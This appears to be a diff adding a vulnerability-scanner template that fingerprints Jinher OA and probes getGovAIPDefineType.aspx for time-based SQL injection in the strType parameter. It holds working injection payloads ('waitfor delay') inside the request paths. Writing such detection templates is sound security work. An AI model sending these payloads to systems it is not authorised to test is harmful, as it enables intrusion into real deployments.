@@ -1,0 +1,45 @@
+id: jinher-jhsoft-getgovaipdefinetype-aspx-sqli
+
+info:
+  name: "Jinher OA getGovAIPDefineType.aspx SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Jinher OA
+  description: |
+    Jinher OA getGovAIPDefineType.aspx is vulnerable to SQL injection, allowing attackers to exploit the strType parameter using a time-based inference technique.
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.govsetaip/getGovAIPDefineType.aspx/?strType=1'waitfor+delay%270:0:5%27--&intId=1"
+      - "{{BaseURL}}/c6/Jhsoft.Web.govsetaip/getGovAIPDefineType.aspx/?strType=1'waitfor+delay%270:0:8%27--&intId=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "NO"
+        part: body
+      - type: word
+        words:
+          - "Cookie:"
+        part: header
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
